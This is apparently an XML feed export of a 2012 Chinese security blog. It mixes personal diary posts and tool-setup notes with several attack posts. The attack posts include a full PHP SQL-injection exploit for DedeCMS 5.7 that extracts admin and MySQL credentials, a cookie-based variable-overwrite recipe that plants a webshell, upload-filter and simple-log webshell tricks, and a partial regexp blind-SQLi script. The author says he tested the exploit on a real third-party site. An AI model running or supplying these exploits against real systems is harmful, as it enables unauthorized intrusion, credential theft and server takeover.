&nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[竟然还有人关注我博客！]]></title>
    <url>%2F2012%2F07%2F21%2F%E7%AB%9F%E7%84%B6%E8%BF%98%E6%9C%89%E4%BA%BA%E5%85%B3%E6%B3%A8%E6%88%91%E5%8D%9A%E5%AE%A2%EF%BC%81%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;刚看完《中国好声音》，看见一qq好友发来个消息！其实我好像还没有和他聊过吧！都不知道怎么加的，他说他一直在关注我的blog，这可把我吓了一跳，竟然还有人关注我的博客！我以为我博客基本不会有回头客的，竟然还有人关注我博客！着实让我幸福来一下！竟然还有人关注我博客！看来我还得继续写我博客啊！记录学习中的点点滴滴！其实前几天我一直都想写的！但是缺乏动力！弄着弄着就懈怠了！ &nbsp;&nbsp;&nbsp;&nbsp;虽然我一直在看《吸血鬼日记》呵呵！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>黑帽seo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2012年的暑假]]></title>
    <url>%2F2012%2F07%2F03%2F2012%E5%B9%B4%E7%9A%84%E6%9A%91%E5%81%87%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 2012年的暑假开始了！今天我回到了家！坐了一天的车，很是疲惫！但是老习惯还是改不了，放下包，第一件事必然是打开电脑。然后睡觉！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;时间还真是快！转眼就大三了，人也大了几岁，胡子也张长了不少。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本来计划： &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看下javascript，研究下xss &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;看下metasploit渗透测试，学习下linux下的渗透 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可是计划赶不上变化啊！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;可能7月份就会被两个项目给占据了！8月份被比赛占据了！ 记录下流水帐！证明我曾经这么想过，曾经这样活过，曾经我还年轻！]]></content>
      <categories>
        <category>琐碎杂事</category>
      </categories>
      <tags>
        <tag>代码转换</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP数学运算代码转换成asp代码]]></title>
    <url>%2F2012%2F06%2F26%2FPHP%E6%95%B0%E5%AD%A6%E8%BF%90%E7%AE%97%E4%BB%A3%E7%A0%81%E8%BD%AC%E6%8D%A2%E6%88%90asp%E4%BB%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;今天考试过后（考的很悲剧），逛论坛看见一贴，说是转换一段asp代码为php代码： &lt;?php function app_hash_url($url) { $seed = "Mining PageRank is AGAINST GOOGLE’S TERMS OF SERVICE."; $result = 0x01020345; for ($i=0; $i&lt;strlen($url); $i++) { $result ^= ord($seed{$i%87}) ^ ord($url{$i}); $result = (($result &gt;&gt; 23) &amp; 0x1FF) | $result &lt;&lt; 9; } return sprintf("8%x", $result); } $url="dddddd"; echo app_hash_url($url); ?&gt; 转换如下： 1.asp没有位移运算，百度了一个位移运算的类 2.格式化输出 &lt;% Class mShift Private m_lPower2(31) Public Function RShift(ByVal lThis, ByVal lBits) On Error Resume Next Init If (lBits &lt;= 0) Then RShift = lThis ElseIf (lBits &gt; 63) Then ’ .. error ... ElseIf (lBits &gt; 31) Then RShift = 0 Else If (lThis And m_lPower2(31 - lBits)) = m_lPower2(31 - lBits) Then RShift = (lThis And (m_lPower2(31 - lBits) - 1)) &#42 m_lPower2(lBits) Or m_lPower2(31) Else RShift = (lThis And (m_lPower2(31 - lBits) - 1)) &#42 m_lPower2(lBits) End If End If End Function Public Function LShift(ByVal lThis, ByVal lBits) On Error Resume Next Init If (lBits &lt;= 0) Then LShift = lThis ElseIf (lBits &gt; 63) Then ’ ... error ... ElseIf (lBits &gt; 31) Then LShift = 0 Else If (lThis And m_lPower2(31)) = m_lPower2(31) Then LShift = (lThis And &amp;H7FFFFFFF) m_lPower2(lBits) Or m_lPower2(31 - lBits) Else LShift = lThis m_lPower2(lBits) End If End If End Function Private Sub Init() On Error Resume Next m_lPower2(0) = &amp;H1&amp; m_lPower2(1) = &amp;H2&amp; m_lPower2(2) = &amp;H4&amp; m_lPower2(3) = &amp;H8&amp; m_lPower2(4) = &amp;H10&amp; m_lPower2(5) = &amp;H20&amp; m_lPower2(6) = &amp;H40&amp; m_lPower2(7) = &amp;H80&amp; m_lPower2(8) = &amp;H100&amp; m_lPower2(9) = &amp;H200&amp; m_lPower2(10) = &amp;H400&amp; m_lPower2(11) = &amp;H800&amp; m_lPower2(12) = &amp;H1000&amp; m_lPower2(13) = &amp;H2000&amp; m_lPower2(14) = &amp;H4000&amp; m_lPower2(15) = &amp;H8000&amp; m_lPower2(16) = &amp;H10000 m_lPower2(17) = &amp;H20000 m_lPower2(18) = &amp;H40000 m_lPower2(19) = &amp;H80000 m_lPower2(20) = &amp;H100000 m_lPower2(21) = &amp;H200000 m_lPower2(22) = &amp;H400000 m_lPower2(23) = &amp;H800000 m_lPower2(24) = &amp;H1000000 m_lPower2(25) = &amp;H2000000 m_lPower2(26) = &amp;H4000000 m_lPower2(27) = &amp;H8000000 m_lPower2(28) = &amp;H10000000 m_lPower2(29) = &amp;H20000000 m_lPower2(30) = &amp;H40000000 m_lPower2(31) = &amp;H80000000 End Sub End Class ’--------------------------------------------------------- function app_hash_url(url) Dim sft Set sft = New mShift seed = "Mining PageRank is AGAINST GOOGLE’S TERMS OF SERVICE." result = &amp;H01020345 for i=0 to len(url)-1 result1 = asc(mid(seed,(i mod 87)+1,1)) result2 = asc(mid(url,i+1,1)) result = result xor (result1 xor result2) result = (sft.LShift(result,23) and &amp;H1FF) or sft.RShift(result,9) next Set sft = Nothing response.write "8" &amp; LCase(hex(result)) end function ’----------------------------------------------------------------------- url1="ddddddddd" response.write app_hash_url(url1) %&gt;]]></content>
      <categories>
        <category>ASP|VB|vbscript</category>
      </categories>
      <tags>
        <tag>代码转换</tag>
        <tag>php</tag>
        <tag>asp</tag>
        <tag>位移运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于一个php加密研究]]></title>
    <url>%2F2012%2F06%2F21%2F%E5%85%B3%E4%BA%8E%E4%B8%80%E4%B8%AAphp%E5%8A%A0%E5%AF%86%E7%A0%94%E7%A9%B6%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp; &nbsp; &nbsp; 昨天忽然有位同鞋q我，说用我写的一片博文的解密方法有问题，叫我帮他看看，昨天太晚了，今天又要考试，于是就睡了，今天下午刚好考完没事，就看了看！其实这个加密很简单的！ &lt;?php echo $gkHfv=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"); echo $wbW=$gkHfv{3}.$gkHfv{6}.$gkHfv{33}.$gkHfv{30}; echo $MojdTZRuOCts=$gkHfv{33}.$gkHfv{10}.$gkHfv{24}.$gkHfv{10}.$gkHfv{24}; echo $tsIqKYinGX=$MojdTZRuOCts{0}.$gkHfv{18}.$gkHfv{3}.$MojdTZRuOCts{0}.$MojdTZRuOCts{1}.$gkHfv{24}; echo $LSeayQNP=$gkHfv{7}.$gkHfv{13}; $wbW.=$gkHfv{22}.$gkHfv{36}.$gkHfv{29}.$gkHfv{26}.$gkHfv{30}.$gkHfv{32}.$gkHfv{35}.$gkHfv{26}.$gkHfv{30}; echo $wbW; //echo($wbW("这里面是密文"); ?&gt; 我输出了这几个变量，发现： $gkHfv n1zb/ma5vt0i28-pxuqy&#426lrkdg9_ehcswo4+f37j $wbW base $MojdTZRuOCts strtr $tsIqKYinGX substr $LSeayQNP 52 $wbW base64_decode 再echo输出了密文: eval(’?&gt;’.$wbW($MojdTZRuOCts($tsIqKYinGX($mclFxVrBAz,$LSeayQNP&#422),$tsIqKYinGX($mclFxVrBAz,$LSeayQNP,$LSeayQNP),$tsIqKYinGX($mclFxVrBAz,0,$LSeayQNP)))); 把上面的变量替换了： $x="密文"; eval(’?&gt;’.base64_decode(strtr(substr($x,52&#422),substr($x,52,52),substr($x,0,52)))); 替换eval为echo 自然明文就出来了 很简单的一个加密啊，看了下明文，好像是一个php程序中的一个文件，估计哪位同鞋看的是一个加密了的程序，想解密改源码吧！ &nbsp; &nbsp;]]></content>
      <categories>
        <category>PHP|MYSQL学习</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>加密</tag>
        <tag>破解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit使用postgresql数据库]]></title>
    <url>%2F2012%2F06%2F18%2Fmetasploit%E4%BD%BF%E7%94%A8postgresql%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数据在在metaspoit中是相当重要的，当做一个大型渗透测试项目的时候，收集到的信息是相当大的，当和你的同伴一起协同作战的时候，你们可能在不同的地方，所以数据共享很重要了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 因此在metasploit中使用数据库来完成以上的工作！ 首先metasploit，默认使用的是postgresql.我使用的不是bt5是ubuntu12.04，metasploit也是我自己安装的，所以下面说下我使用数据库的步骤！本人初学metasploit这个神器，不对的地方请指出！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 首先我们安装数据库： sudo apt-get install postgresql-8.4 postgresql-client-8.4 &nbsp;&nbsp;&nbsp; 安装好了过后就创建用户密码和数据库 &nbsp; su -postgres进入数据库 createdb nmap createuser nmap 这儿要求你输入密码,我设置的是namp 输入后确定就ok exit退出 然后就是进入msfconsole 进入了msf shell界面了 db_connet nmap:nmap@127.0.0.1/nmap 然后会看见msf的一些输出，这些是初始数据，第一次链接会有，第二次就没了 测试下是否链接好了 db_status 回显你一看就明白了 postgresql conneted to nmap &nbsp; &nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>metaspoit</tag>
        <tag>postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在ubuntu12.04上安装Nmap6.0]]></title>
    <url>%2F2012%2F06%2F16%2F%E5%9C%A8ubuntu12-04%E4%B8%8A%E5%AE%89%E8%A3%85Nmap6-0%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 前几天装了ubuntu12.04感觉还是不错的，所以打算长期用这个系统，但是一些必备的工具是不能少的，比如:msf、nmap、burpsuite、sqlmap等等！除了nmap以为其他的工具安装都很简单！就不记录了！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 记录下nmap的安装过程！这个也是google到的，原文地址http://scottlinux.com/2012/05/22/install-nmap-6-on-debian-or-ubuntu-linux/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 首先需要安装一些库文件支持： sudo apt-get install build-essential libssl-dev checkinstall &nbsp;&nbsp;&nbsp; 然后下载nmap6.0，我是直接在官网用firefox下载的，你也可一用wget下载：wget http://nmap.org/dist/nmap-6.00.tar.bz2 &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; 下载好后解压：tar xvf nmap-6.00.tar.bz2 &nbsp;&nbsp;&nbsp; 并转到nmap目录：cd nmap-6.00/ &nbsp;&nbsp;&nbsp; 下面就是安装过程了，和官网上介绍的一样./configure --without-liblua make sudo checkinstall &nbsp;&nbsp;&nbsp; 然后他会让你输入一个描述： 直接输入nmap &nbsp;&nbsp;&nbsp; 下面就一路默认下去了 最后更具我google的文章就可以直接在终端下使用nmap命令了，但是我没有成功，不能直接使用那个nmap。 &nbsp;&nbsp;&nbsp;&nbsp;于是乎我修改了当前用户的主文件夹下的.bashrc文件.在其最后加上alias nmap=’/home/lanu/tools/nmap-6.00/nmap’ &nbsp;&nbsp;&nbsp; 然后保存文件，注销后重新进去.这样就可一直接在终端下使用nmap了！&nbsp;]]></content>
      <categories>
        <category>Android|Java|Linux</category>
      </categories>
      <tags>
        <tag>nmap-6.00</tag>
        <tag>ubuntu12.04</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DEDE全局变量再次覆盖研究]]></title>
    <url>%2F2012%2F06%2F03%2FDEDE%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%86%8D%E6%AC%A1%E8%A6%86%E7%9B%96%E7%A0%94%E7%A9%B6%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天在论坛看见一童鞋发帖说的是关于dede全局变量覆盖再次利用的东西！ 有大牛发博文：http://www.0x50sec.org/dedecms%e5%87%a0%e4%b8%aa%e6%9c%80%e6%96%b0bug%e5%88%86%e6%9e%90/ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是关于里面的$_REQUEST为什么没有读取$_COOKIE值俺有点小异议！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 我认为是因为php版本问题而不是什么apache和iis的问题，因为在php 5.3以后php.ini中默认request_order=”GP” 俺们用事实说话： 测试脚本： &lt;?php var_dump($_REQUEST); echo "?????REQUEST END????&lt;br&gt;"; var_dump($_COOKIE); echo "?????COOKIE END????&lt;br&gt;"; ?&gt; 当我的request_order=”GPC”的时候， 访问http://127.0.0.1/test/requesttest.php?hacker=11， 再访问： javascript:document.cookie="test"; 返回 array(2) { ["hacker"]=&gt; string(2) "11" ["fuck_you"]=&gt; string(0) "" } ?????REQUEST END???? array(1) { ["fuck_you"]=&gt; string(0) "" } ?????COOKIE END???? 如果我request_order=”GP” 返回则是： array(1) { ["hacker"]=&gt; string(2) "11" } ?????REQUEST END???? array(1) { ["fuck_you"]=&gt; string(0) "" } ?????COOKIE END????----------------- 所以俺得出结论：若果dedecms装在php &gt; 5.3的服务器中，可以利用变量再次覆盖！ 测试我刚下的dedecms 开外链设置数据库，你懂得！ GRANT ALL PRIVILEGES ON &#42.&#42 TO ’root’@’%’ IDENTIFIED BY ’123456’ WITH GRANT OPTION; 数据库见附件，我已经设置好的！ 然后访问http://127.0.0.1/dede/plus/ad_js.php?aid=1&amp;nocache=1 再用javascript设置：&nbsp; javascript:document.cookie="GLOBALS[cfg_dbhost]=10.60.133.60";document.cookie="GLOBALS[cfg_dbuser]=root";document.cookie="GLOBALS[cfg_dbpwd]=123456";document.cookie="GLOBALS[cfg_dbname]=test";document.cookie="GLOBALS[cfg_dbprefix]=dede_"; 再次访问http://127.0.0.1/dede/plus/ad_js.php?aid=1&amp;nocache=1 生成的一句话：http://127.0.0.1/dede/plus/ln.php 密码c 俺最新版本dedecms测试成功 以上皆是小菜一家之言，如有错误，希望指正！]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>dede漏洞</tag>
        <tag>变量覆盖</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[dedecms v5.7注入和上传漏洞]]></title>
    <url>%2F2012%2F06%2F02%2Fdedecms-v5-7%E6%B3%A8%E5%85%A5%E5%92%8C%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个很早就出来了，但是一直没有去测试，昨晚闲着无聊，于是乎检测了一个站，这个站还是比较大的，算是独立服务器吧！在他的程序中有dz有dedecms和一些其他的程序，这个dedecms就是有漏洞的！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据网上流传的注入方法，我测试成功了，记录记录下来以后用！ 一、利用方法： &lt;?php ini_set("max_execution_time",0); error_reporting(7); ob_implicit_flush(true); function usage() { global $argv; exit( " --+++============================================================+++--". " --+++=================== DeDe 5.7 sql Exploit ==================+++--". " --+++============================================================+++--". " [+] Author : CunZhang". " [+] Time : 2012-4-10". " [+] Blog : http://www.sysmjj.com". " [+] Usage : php ".$argv[0]." &lt;hostname&gt; &lt;path&gt;". " [+] Exp : php ".$argv[0]." localhost /". " "); } function query($biao,$chr,$chs) { global $pre; switch ($chs){ case 1: $query = "@`’` Union select concat(0x7e,0x27,count(&#42),0x27,0x7e) from `".$pre."admin` where 1 or `"; break; case 2: $query = "@`’` Union select concat(0x7e,0x27,userid,0x7C,pwd,0x27,0x7e) from `".$pre."admin` limit $chr,1 Union select concat(0x7e,0x27,userid,0x7C,pwd,0x27,0x7e) from `".$pre."admin` where 1=2 or `"; break; case 3: $query = "’"; break; case 4: $query = "@`’` Union select concat(0x7e,0x27,count(&#42),0x27,0x7e) from `mysql`.user where 1 or `"; break; case 5: $query = "@`’` Union select concat(0x7e,0x27,Host,0x7C,User,0x7C,Password,0x7C,Select_priv,0x27,0x7e) from `mysql`.user limit $chr,1 Union select 1 from `".$pre."admin` where 1=2 or `"; break; case 6: $query = "@`’` Union select concat(0x7e,0x27,Load_file(0x633A5C626F6F742E696E69),0x27,0x7e) from `mysql`.user where 1 or `"; break; } //echo $query." "; $query = urlencode($query); return $query; } function exploit($hostname, $path,$biao, $chr, $chs) { $conn = fsockopen($hostname, 80); if (!$conn){ exit(" [-] No response from $conn "); } $postdata = "action=post&amp;membergroup=".query($biao,$chr,$chs); $message = "POST ".$path."member/ajax_membergroup.php HTTP/1.1 "; $message .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-ms-application, application/x-ms-xbap, application/vnd.ms-xpsdocument, application/xaml+xml, &#42/&#42 "; $message .= "Accept-Language: zh-cn "; $message .= "Content-Type: application/x-www-form-urlencoded "; $message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) "; $message .= "Host: $hostname "; $message .= "Content-Length: ".strlen($postdata)." "; $message .= "Cookie: $sessions "; $message .= "Connection: Close "; $message .= $postdata; //echo $message ; $inheader = 1; fputs($conn, $message); while (!feof($conn)) $reply .= fread($conn, 1024); fclose($conn); //print $reply; $reply=substr($reply,strpos($reply," ")); //echo $reply; //echo iconv(’UTF-8’, ’GB2312’, $reply); return $reply; } function GetPre($hostname,$path) { $tmp = array(); $exit = 0; while ($exit==0) { $response = exploit($hostname, $path,1,1,3); //echo $response; if (preg_match("/FROM (.&#42?)member_group/i",$response,$tmp)) { $exit = 1; return $tmp[1]; } else return "dede_"; } } function dbcounts($hostname,$path) { $tmp = array(); $exit = 0; while ($exit==0) { $response = exploit($hostname, $path,1,1,4); //echo $response; if (preg_match("/~’(.&#42?)’~/i",$response,$tmp)) { $exit = 1; return $tmp[1]; } else return "Can’t Get "; } } function counts($hostname,$path) { $tmp = array(); $exit = 0; while ($exit==0) { $response = exploit($hostname, $path,1,1,1); //echo $response; if (preg_match("/~’(.&#42?)’~/i",$response,$tmp)) { $exit = 1; return $tmp[1]; } else return "Can’t Get "; } } function GetDBUser($hostname,$path,$c) { $tmp = array(); $exit = 0; while ($exit==0) { $response = exploit($hostname, $path,1,$c-1,5); if (preg_match("/~’(.&#42?)’~/i",$response,$tmp)) { $exit = 1; return $tmp[1]; } else return "Can’t Get "; } } function GetUser($hostname,$path,$c) { $tmp = array(); $exit = 0; while ($exit==0) { $response = exploit($hostname, $path,1,$c-1,2); if (preg_match("/~’(.&#42?)’~/i",$response,$tmp)) { $exit = 1; return $tmp[1]; } else return "Can’t Get "; } } /////////////////////////////////////////////////////////////////// /////////////////////////////////////////////////////////////////// if ($argc != 3) usage(); $hostname = $argv[1]; $path = $argv[2]; echo "[+] ======================================================= "; echo "[+] Pre: "; ob_flush(); flush(); $pre=GetPre($hostname, $path); echo $pre." "; echo "[+] DbCount: "; ob_flush(); flush(); $dbcount=dbcounts($hostname, $path); echo $dbcount." "; /////////////////////////////////////////////////////////////////// $c=1; /////////////////////////////////////////////////////////////////// while($c&lt;=$dbcount){ echo "[+] &lt;".($c)."&gt; "; ob_flush(); flush(); $dbuser=GetDBUser($hostname,$path,$c); echo $dbuser." "; $c++; } /////////////////////////////////////////////////////////////////// echo "[+] : "; ob_flush(); flush(); $count=counts($hostname, $path); echo $count." "; ob_flush(); flush(); /////////////////////////////////////////////////////////////////// $c=1; /////////////////////////////////////////////////////////////////// while($c&lt;=$count){ echo "[+] &lt;".($c)."&gt; "; ob_flush(); flush(); $user=GetUser($hostname,$path,$c); echo $user." "; $c++; } /////////////////////////////////////////////////////////////////// ?&gt; 直接是exp，网上还有很多直接的工具利用！ 这个不是重点！重点是分析漏洞形成的原因！&nbsp; 二、漏洞分析 &nbsp;&nbsp;&nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[百捷网站推广管理系统后台突破一流拦截上传]]></title>
    <url>%2F2012%2F06%2F01%2F%E7%99%BE%E6%8D%B7%E7%BD%91%E7%AB%99%E6%8E%A8%E5%B9%BF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%90%8E%E5%8F%B0%E7%AA%81%E7%A0%B4%E4%B8%80%E6%B5%81%E6%8B%A6%E6%88%AA%E4%B8%8A%E4%BC%A0%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 前几天看见90sec有人发帖问突破一流拦截，于是乎我回复了，楼主给了我目标，通过测试最后成功上传！ &nbsp;&nbsp;&nbsp;&nbsp; 开始常规传了几个文件都失败了，于是我上传stm文件包含upload.asp读取他的源码，分析了下源码，发现了他的一个缺陷！ 就是我上传没有后缀的文件，他会直接以文件名为后缀，于是我就上传了一个名字为asa的图片马，于是成功得到shell。 &nbsp;&nbsp;&nbsp;&nbsp;当然我刚到论坛发现已经有人解决了这个问题，方法是 &nbsp;&nbsp;&nbsp; 直接修改upload.asp?folder=Products&amp;type=image&amp;size=image中的image为asa然后上传图片马！ &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>90sec</tag>
        <tag>一流拦截突破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[simple-log后台写入缓存漏洞和全局文件读取漏洞]]></title>
    <url>%2F2012%2F05%2F29%2Fsimple-log%E5%90%8E%E5%8F%B0%E5%86%99%E5%85%A5%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%85%A8%E5%B1%80%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;前段时间做学校的比赛题目，碰到了simple-log博客程序，到了后台需要拿webshell，但是网上的在模板哪儿写入一句话被管理员做了处理，没法直接写入了，但是可以抓包修改，这个不是重点。 &nbsp;&nbsp;&nbsp;&nbsp;重点是我下载程序读了下代码，发现了两个可利用的算是漏洞吧！ 一、写缓存拿webshell &nbsp;&nbsp;&nbsp;&nbsp; /home/cache/sl_config.php这个文件里面记录的是博客设置的缓存数据 a:16:{s:9:"blog_desc";s:4:"test";s:12:"blog_keyword";s:0:"";s:9:"blog_name";s:4:"test";s:14:"cache_lifetime";s:2:"24";s:12:"comment_safe";s:1:"0";s:12:"comment_sort";s:1:"1";s:6:"domain";s:21:"http://127.0.0.1/log/";s:8:"is_cache";s:1:"0";s:6:"is_reg";s:1:"0";s:6:"notice";s:18:"博客通知信息";s:12:"open_comment";s:1:"0";s:10:"pager_size";s:1:"6";s:9:"page_size";s:2:"10";s:7:"rewrite";s:1:"0";s:13:"template_name";s:7:"default";s:2:"tj";s:0:"";}&nbsp; 于是乎修改后台博客设置，插入一句话 &nbsp; 插入保存后你会发现 &nbsp; 为什么程序作者没有过滤呢！这个我就不知道了！呵呵呵 于是菜刀连接一句话 &nbsp; 二、全局文件读取漏洞 这个是在模板哪儿 &nbsp; 虽然他模板名称是一个下拉框，但是我们是可以修改的 你懂的修改value的值，他这儿也没有过滤，代码分析就自己去下载程序分析看吧！ 然后我们用下拉框选择修改的这一项，惊喜就出现了 肯定大牛们这些小漏洞都是知道的，只是没有说出来而已，估计是不屑说吧！小菜我就和还不知道的和我一样的小菜分享下！]]></content>
      <categories>
        <category>0day漏洞</category>
      </categories>
      <tags>
        <tag>simple-log后台拿webshell</tag>
        <tag>后台全局文件读取漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用互联网收集信息?Information_gathering_Doxing]]></title>
    <url>%2F2012%2F05%2F26%2F%E5%88%A9%E7%94%A8%E4%BA%92%E8%81%94%E7%BD%91%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF-Information-gathering-Doxing%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 今天看见国外一技术网站的一个pdf，名字叫做Information_gathering_Doxing，还把我弄蒙了，什么叫doxing，这个小菜还真不知道，看了文档原来就是说利用互联网收集信息，然后社工目标！ &nbsp;]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>Doxing</tag>
        <tag>社会工程学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL盲注之使用正则表达式]]></title>
    <url>%2F2012%2F05%2F26%2FSQL%E7%9B%B2%E6%B3%A8%E4%B9%8B%E4%BD%BF%E7%94%A8%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[&nbsp;&nbsp;&nbsp;&nbsp; 今天在群共享里发现了一个pdf的文档，是个好东西，他主要是讲解的使用正则表达式来盲注！ 他也给了一段测试代码！可以自己测试！ &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &lt;?php /&#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 Example of Regexp Attack in Blind SQL Injection by IHteam &#42 This example work only with MySQL. &#42 &#42 &#42 This program is free software; you can redistribute it and/or modify &#42 it under the terms of the GNU General Public License as published by &#42 the Free Software Foundation; either version 2 of the License, or &#42 (at your option) any later version. &#42 &#42 This program is distributed in the hope that it will be useful, &#42 but WITHOUT ANY WARRANTY; without even the implied warranty of &#42 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the &#42 GNU General Public License for more details. &#42 &#42 &#42 Usage: &#42 &#42 ./regexp_bsqli.php http://localhost/page.php?id=1 users password id_user 1 &#42 &#42 &#42 WHERE: &#42 &#42 http://localhost/page.php?id=1 -&gt; Vulnerable page with valid id. &#42 users -&gt; Users Table. &#42 password -&gt; Password column. &#42 id_user -&gt; Primary key of users table. &#42 1 -&gt; Valid id_user. &#42 &#42 &#42 &#42 The query will result in: &#42 ... FROM users WHERE id_user = 1 and password ... &#42 &#42 &#42 Written by R00T_ATI and white_sheep. &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42 &#42/ $url = $argv[1]; // the url is like this: "http://localhost/index.php?id=1" $table_name = $argv[2]; // name of table to extract hash $column_name = $argv[3]; // column name that contain hash $id_name = $argv[4]; // primary key to identify a single user $id_val = $argv[5]; // a real value of key $chars = array( "a", "b", "c", "d", "e", "f" ); // array of chars $numbers = array( "0", "1", "2", "3", "4", "5", "6", "7", "8", "9"); // array of numbers $nquery = 0; $fchars = 0; // MIN value for chars array $lchars = 5; // MAX value for chars array $old_lchars = $lchars; $fnumbers = 0; // MIN value for numbers array $lnumbers = 9; // MAX value for numbers array $old_lnumbers = $lnumbers; $counter = array ("0" =&gt; 1, "1" =&gt; 2, "2" =&gt; 3, "3" =&gt; 4, "4" =&gt; 5, "5" =&gt; 6, "6" =&gt; 7, "7" =&gt; 8, "8" =&gt; 9, "9" =&gt; 10, "a" =&gt; 11, "b" =&gt; 12, "c" =&gt; 13, "d" =&gt; 14, "e" =&gt; 15, "f" =&gt; 16 ); $urland = $url . "%20and%201="; $exit = false; $regexpc = ""; $regexpn = ""; $founded = ""; function search($array, $start, $end, $founded){ global $urland, $table_name, $column_name, $id_name, $id_val, $and11, $and12, $nquery; $old_end = $end; $end = floor(($end+$start)/2); while (1) { if ( ( $end - $start ) != 1 &amp;&amp; ( $start - $end ) != 0) { $regexp = "’^" . $founded . "[" . $array[$start] . "-" . $array[$end] . "]’"; $query = "(SELECT 1 FROM $table_name WHERE $id_name = $id_val and $column_name REGEXP $regexp)"; $nquery++; echo "Page Request: " . $urland . $query . " "; $result = 